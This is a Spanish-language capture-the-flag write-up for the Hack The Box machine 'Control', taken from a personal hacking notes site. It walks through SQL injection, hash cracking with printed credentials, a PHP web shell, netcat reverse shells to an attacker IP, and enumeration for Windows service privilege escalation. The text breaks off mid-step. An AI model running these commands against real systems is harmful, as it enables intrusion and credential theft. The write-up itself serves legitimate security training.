<!DOCTYPE HTML>
<html lang="es" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Control - Secronomicón</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../../../../favicon.svg">
        <link rel="shortcut icon" href="../../../../../favicon.png">
        <link rel="stylesheet" href="../../../../../css/variables.css">
        <link rel="stylesheet" href="../../../../../css/general.css">
        <link rel="stylesheet" href="../../../../../css/chrome.css">
        <link rel="stylesheet" href="../../../../../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../../../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../../../highlight.css">
        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../../../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../../../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../../../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../../../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../../../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../../../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../../../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/pwning/bof-oscp.html"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../../../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../../../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Control/index.html" class="active"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../../../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../../../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Secronomicón</h1>

                    <div class="right-buttons">
                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="estadísticas"><a class="header" href="#estadísticas">Estadísticas</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Descripción</th></tr></thead><tbody>
<tr><td>Nombre</td><td><a href="https://www.hackthebox.com/home/machines/profile/218">Control</a></td></tr>
<tr><td>OS</td><td>Windows</td></tr>
<tr><td>Dificultad oficial</td><td>Hard</td></tr>
<tr><td>Dificultad de comunidad</td><td><img src="images/difficulty.png" alt="Dificultad" /></td></tr>
<tr><td>Puntos</td><td>40</td></tr>
<tr><td>Creadores</td><td><a href="https://www.hackthebox.com/home/users/profile/31190">TRX</a></td></tr>
</tbody></table>
</div>
<h1 id="reconocimiento"><a class="header" href="#reconocimiento">Reconocimiento</a></h1>
<h2 id="escaneo-de-host"><a class="header" href="#escaneo-de-host">Escaneo de host</a></h2>
<h3 id="escaneo-completo-de-puertos"><a class="header" href="#escaneo-completo-de-puertos">Escaneo completo de puertos</a></h3>
<pre><code class="language-bash">└─$ sudo nmap -sS --min-rate 5000 -vvv -opèn -p- -n -Pn -oG nmap/all_ports_ss $TARGET
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:44 EDT
Initiating SYN Stealth Scan at 00:44
Scanning 10.10.10.167 [65535 ports]
Discovered open port 3306/tcp on 10.10.10.167
Discovered open port 135/tcp on 10.10.10.167
Discovered open port 80/tcp on 10.10.10.167
Discovered open port 49666/tcp on 10.10.10.167
Discovered open port 49667/tcp on 10.10.10.167
Completed SYN Stealth Scan at 00:45, 26.41s elapsed (65535 total ports)
Nmap scan report for 10.10.10.167
Host is up, received user-set (0.064s latency).
Scanned at 2022-06-07 00:44:41 EDT for 26s
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 127
135/tcp   open  msrpc   syn-ack ttl 127
3306/tcp  open  mysql   syn-ack ttl 127
49666/tcp open  unknown syn-ack ttl 127
49667/tcp open  unknown syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 60 (2.496KB)
</code></pre>
<h3 id="escaneo-específico"><a class="header" href="#escaneo-específico">Escaneo específico</a></h3>
<pre><code class="language-bash">└─$ nmap -sCV -p 80,135,3306,49666,49667 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 00:45 EDT
Nmap scan report for 10.10.10.167
Host is up (0.064s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Fidelity
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings:
|   NULL:
|_    Host '10.10.14.16' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=6/7%Time=629ED800%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4A,&quot;F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.16'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;);
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds
</code></pre>
<h1 id="enumeración"><a class="header" href="#enumeración">Enumeración</a></h1>
<h2 id="servicios"><a class="header" href="#servicios">Servicios</a></h2>
<h3 id="http---80"><a class="header" href="#http---80">http - 80</a></h3>
<h4 id="manual"><a class="header" href="#manual">Manual</a></h4>
<p>Visualmente no se identificó nada relevante, dado que en su mayoría los textos contienen <code>Lorem ipsum</code> salvo algunas rutas expuestas mediante a la interacción con parte de la interfaz. Visualizando así un error en la ruta <code>admin.php</code> después de dar click al botón de Login.</p>
<p><img src="images/enum_1.png" alt="Error en admin.php" /></p>
<p>Al navegar al código fuente de la página inicial, se identificaron dos posibles pistas respecto a la construcción del sitio.</p>
<p><img src="images/enum_2.png" alt="Pistas iniciales" /></p>
<ol>
<li>
<p>La exposición de código del sitio <code>functions.js</code>.</p>
</li>
<li>
<p>Una posible ruta hacia otro host o algo similar.</p>
</li>
</ol>
<p>Al navegar al script se pueden identificar rutas que pudieran formar parte de un CRUD y que difícilmente puedan ser encontradas en algún diccionario de fuzzing.</p>
<p><img src="images/enum_3.png" alt="Código de functions.js" /></p>
<p>Al identificar la composición de la petición e interactuar con <code>view_products.php</code> haciendo uso de:</p>
<pre><code class="language-bash">curl -i http://10.10.10.167/view_product.php -X POST -F &quot;productId=1&quot;
</code></pre>
<p>Se puede observar una tabla en html permitiendo la suposición de que se desplegarían en este sitio los atributos del producto en cuestión.</p>
<p><img src="images/enum_4.png" alt="Vista inicial de producto" /></p>
<p>Después de varias iteraciones, buscando un identificador válido (26) se puede visualizar que la suposición era la correcta.</p>
<p><img src="images/enum_5.png" alt="ID válido" /></p>
<h4 id="ffuf"><a class="header" href="#ffuf">ffuf</a></h4>
<p>Para complementar lo obtenido se buscaron rutas adicionales por medio de:</p>
<pre><code class="language-bash">ffuf -c -ic -u http://10.10.10.167/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt,.bak,.php,.html
</code></pre>
<p><img src="images/enum_6.png" alt="Rutas adicionales encontradas" /></p>
<h1 id="explotación"><a class="header" href="#explotación">Explotación</a></h1>
<h2 id="inyección-sql"><a class="header" href="#inyección-sql">Inyección SQL</a></h2>
<h3 id="ejecución"><a class="header" href="#ejecución">Ejecución</a></h3>
<p>Teniendo en cuenta la tecnología empleada y parte de los parámetros usados, se buscó explotar una inyección SQL haciendo uso de <code>sqlmap</code>, utilizando:</p>
<pre><code class="language-bash">sqlmap -u &quot;http://10.10.10.167/view_product.php&quot; --data=&quot;productId=1&quot; --dbs
</code></pre>
<p>Obteniendo de esta forma payloads válidos y la capacidad de obtener los registros de la base de datos.</p>
<ul>
<li>Payload: <code>productId=1 UNION ALL SELECT &lt;query&gt;-- -</code></li>
</ul>
<p><img src="images/exploit_1.png" alt="Inyección con sqlmap" /></p>
<p>Después no encontrar información relevante respecto a la aplicación web, se buscó obtener información respecto a los usuarios de la base de datos, mediante:</p>
<pre><code class="language-bash">sqlmap -u &quot;http://10.10.10.167/view_product.php&quot; --data=&quot;productId=1&quot; -D mysql -T user --passwords
</code></pre>
<p>Obteniendo así sus hashes.</p>
<p><img src="images/exploit_2.png" alt="Hashes de usuarios de base de datos" /></p>
<p>A lo que posteriormente, una vez guardados se hizo uso de <code>john</code> para crackearlos.</p>
<p><img src="images/exploit_3.png" alt="Crackeo con john" /></p>
<p>Adicional a ello, haciendo uso de <a href="https://crackstation.net/">CrackStation</a> se obtuvo la contraseña de un hash adicional del cuál no se obtuvo con <code>john</code>.</p>
<p><img src="images/exploit_4.png" alt="Crackeo con CrackStation" /></p>
<p>Identificando así las credenciales:</p>
<pre><code class="language-text">manager:l3tm3!n
hector:l33th4x0rhector
</code></pre>
<h2 id="rce"><a class="header" href="#rce">RCE</a></h2>
<p>Después de obtener las credenciales y buscar emplearlas con los servicios expuestos en la máquina (mysql únicamente dado que no se cuenta con <code>smb</code> o algún otro servicio en donde se pudieran haber usado) <a href="https://kayran.io/blog/web-vulnerabilities/sqli-to-rce/">se buscó la forma</a> para que mediante la inyección SQL se para pudiera lograr la ejecución remota de código mediante la escritura de un script en php, haciendo uso de instrucciones como <code>INTO OUTFILE</code> o <code>INTO DUMPFILE</code>.</p>
<p>Para lograrlo fue necesario identificar el directorio en el que se encuentra la instalación, de acuerdo al <a href="https://docs.microsoft.com/en-us/previous-versions/office/developer/sharepoint-2010/ms474356(v=office.14)">enlace encontrado</a> se indica que por predeterminado la ruta suele ser <code>c:\inetpub\wwwroot</code>, permitiendo de esta forma complementar hacia dónde debería dirigirse la escritura del script.</p>
<p>Después de probar con diferentes payloads respecto al escape de las barras (<code>\</code>), dado que la respuesta del servidor es identificada como un <code>500 Internal Server Error</code>, se realizó una prueba de la escritura mediante:</p>
<pre><code class="language-bash">curl -i http://10.10.10.167/view_product.php -X POST -F &quot;productId=26 UNION ALL SELECT 'Hello world' INTO OUTFILE 'c:\\\\\\\\inetpub\\\\wwwroot\\\\test.txt'-- -&quot;
</code></pre>
<p>Logrando escribir satisfactoriamente al archivo indicado.</p>
<p><em><strong>En este punto es importante recalcar para futuros escenarios similares que no siempre es verdad que porque la respuesta del servidor sea 500, significa que no se esté ejecutando el payload indicado.</strong></em></p>
<p><img src="images/exploit_5.png" alt="Petición creación de archivo" /></p>
<p>Visualizandolo en el servidor.</p>
<p><img src="images/exploit_6.png" alt="Visualización en navegador" /></p>
<p>Permitiendo de esta manera cambiar el payload a </p>
<pre><code class="language-bash">curl -i http://10.10.10.167/view_product.php -X POST -F 'productId=26 UNION ALL SELECT &quot;&lt;?php system($_GET[\&quot;cmd\&quot;])?&gt;&quot; INTO OUTFILE &quot;c:\\\\\\\\inetpub\\\\wwwroot\\\\srrequiem.php&quot;-- -'
</code></pre>
<p>Logrando así tener un script listo para ejecutar comandos en la máquina.</p>
<p><img src="images/exploit_7.png" alt="Webshell" /></p>
<p>Por lo que se estableció una reverse shell haciendo uso del binario <code>nc.exe</code>, subiéndolo a la máquina mediante la request:</p>
<pre><code class="language-text">http://10.10.10.167/srrequiem.php?cmd=powershell.exe%20iwr%20http://10.10.14.16/nc.exe%20-outfile%20c:\windows\temp\nc.exe
</code></pre>
<p>Montando previamente el servidor web donde se encuentra el binario a descargar. Para ejecutarlo posteriormente con:</p>
<pre><code class="language-text">http://10.10.10.167/srrequiem.php?cmd=c:\windows\temp\nc.exe%20-e%20powershell.exe%2010.10.14.16%201234
</code></pre>
<p>Logrando así acceso de una manera más interactiva.</p>
<p><img src="images/exploit_8.png" alt="Reverse shell" /></p>
<h1 id="post-explotación"><a class="header" href="#post-explotación">Post Explotación</a></h1>
<h2 id="enumeración-1"><a class="header" href="#enumeración-1">Enumeración</a></h2>
<p>Al buscar atar cabos sueltos respecto a lo indicado en el código fuente del sitio, se pudo visualizar que en el contenido del script de <code>admin.php</code> se hace un filtrado de cabeceras indicado por <code>HTTP_X_FORWARDED_FOR</code> buscando la IP indicada <code>192.168.4.28</code>. A lo que por consiguiente si se añadiera la cabecera <code>X-Forwarded-For: 192.168.4.28</code> a las peticiones realizadas se visualizaría el contenido de <code>admin.php</code>, logrando así un bypass de la validación.</p>
<p><img src="images/post_14.png" alt="Validación de cabeceras" /></p>
<h2 id="escalación-de-privilegios"><a class="header" href="#escalación-de-privilegios">Escalación de privilegios</a></h2>
<h3 id="nt-authorityiusr--hector"><a class="header" href="#nt-authorityiusr--hector">nt authority\iusr → hector</a></h3>
<p>Habiendo identificado que existe el usuario <code>hector</code> en el sistema operativo por medio del listado de directorios de <code>c:\users</code>, se dispuso a buscar la manera de ejecutar comandos mediante las credenciales obtenidas.</p>
<p><img src="images/post_1.png" alt="Listado de c:\users" /></p>
<p>Habiendo encontrado <a href="https://lazyadmin.nl/powershell/start-process/">esta</a> y <a href="https://davidhamann.de/2019/12/08/running-command-different-user-powershell/">esta</a> referencias, se enviaron las siguientes instrucciones para lograr ejecutar comandos como el usuario <code>hector</code>.</p>
<p>Previamente identificando el nombre de la máquina y/o hostname con:</p>
<pre><code class="language-powershell"># Cualquiera de los siguientes comandos
hostname
$env:COMPUTERNAME
[Environment]::MachineName
</code></pre>
<p>Según lo indica <a href="https://adamtheautomator.com/powershell-get-computer-name/">este blog</a> para encontrar ese valor y usarlo posteriormente.</p>
<p><img src="images/post_2.png" alt="Nombre de máquina" /></p>
<pre><code class="language-powershell">$userName = 'fidelity\hector'
$userPassword = 'l33th4x0rhector'
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword)
Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { whoami }
</code></pre>
<p>Logrando así ejecución como el usuario <code>hector</code>.</p>
<p><img src="images/post_3.png" alt="Ejecución de comandos como hector" /></p>
<p>Dadas las limitaciones que se obtuvieron al ejecutar el mismo binario de <code>netcat</code> previamente subido debido a permisos, se decidió ejecutar el mismo binario con la diferencia de ejecutarlo a través de red, exponiendo el binario mediante:</p>
<pre><code class="language-bash">impacket-smbserver smbFolder $(pwd) -smb2support
</code></pre>
<p>Y ejecutándolo con:</p>
<pre><code class="language-powershell">Invoke-Command -ComputerName Fidelity -Credential $credObject -ScriptBlock { \\10.10.14.16\smbFolder\nc.exe -e cmd.exe 10.10.14.16 4321 }
</code></pre>
<p>Obteniendo así una segunda revershell pero en esta ocasión como el usuario <code>hector</code>.</p>
<p><img src="images/post_4.png" alt="Reverse shell como hector" /></p>
<h3 id="hector--nt-authoritysystem"><a class="header" href="#hector--nt-authoritysystem">hector → nt authority\system</a></h3>
<p>Buscando obtener información relevante para escalar como administrador, se ejecutó <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winPEAS</a>, identificando que se cuenta con un gran número de registros a los cuales se tiene acceso completo.</p>
<p><img src="images/post_5.png" alt="Lista de registros con acceso" /></p>
<p>Bajo el conocimiento de escenarios previos, se sabe que es posible modificar la configuración de los servicios para poder secuestrar la ruta del binario, si se lograra identificar un servicio que se estuviera ejecutando como administrador al lograr la modificación e iniciar el servicio se obtendría acceso como administrador. Dichas configuraciones de servicios se suelen encontrar en los valores de los registros mostrados, por lo que, se realizó un filtrado de estos servicios bajo su perfil de ejecución y status para que a la hora de modificarlo se pudiera iniciar el servicio.</p>
<pre><code class="language-powershell">$services = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\* # Para obtener todos los servicios
$filtered_services = $services | where { ($_.ObjectName -match 'LocalSystem') -And ($_.Start -match '3') } # Para filtar y obtener los servicios que se ejecuten con permisos elevados y que se puedan iniciar manualmente
</code></pre>
<p>En este punto quedaría filtrar los servicios a los que el usuario hector cuenta con permisos para iniciar cualquier servicio. Para esto se requiere identificar el servicio que cuente con la cadena <code>RP</code> según es especificado en <a href="https://dimitri.janczak.net/2018/06/01/start-stop-service-rights-to-non-administrators/">este blog</a> en la propiedad de <code>Sddl</code> de los permisos desplegados de la lista actual de servicios.</p>
<p><img src="images/post_6.png" alt="Propiedad sddl de lista de registros" /></p>
<p>Lo que individualmente por servicio es ubicado en la propiedad <code>Security</code>, en donde se encuentra en forma binaria.</p>
<p><img src="images/post_7.png" alt="Propiedad security de registro" /></p>
<p>Trasladandolo a una lectura similar a la propiedad <code>sddl</code>, se puede ejecutar <code>cmd /c sc sdshow wuauserv</code> para visualizar el valor de mejor manera.</p>
<p><img src="images/post_8.png" alt="Propiedad security convertida a sddl" /></p>
<p>Igualmente, el resultado no es entendible a menos que se busque alguna referencia para comparar, por lo que se puede hacer uso de:</p>
<pre><code class="language-powershell">ConvertFrom-SDDLString -Sddl &quot;D:(A;;CCLCSWRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)&quot;
</code></pre>
<p>Para visualizarlo de mejor manera ya que se permite su conversión mediante powershell.</p>
<p><img src="images/post_9.png" alt="Lectura de propiedad sddl" /></p>
<p>Por lo que se iteró en la lista previa de servicios la búsqueda de este permiso mediante el siguiente ciclo:</p>
<pre><code class="language-powershell">$services_names = $filtered_services.pschildname
foreach ($service in $services_names) {
    $sddl = (cmd /c sc sdshow $service)
    if ($sddl -match &quot;RP[A-Z]*?;;;AU&quot;) {
        $service
    }
}

# Iteración en una línea
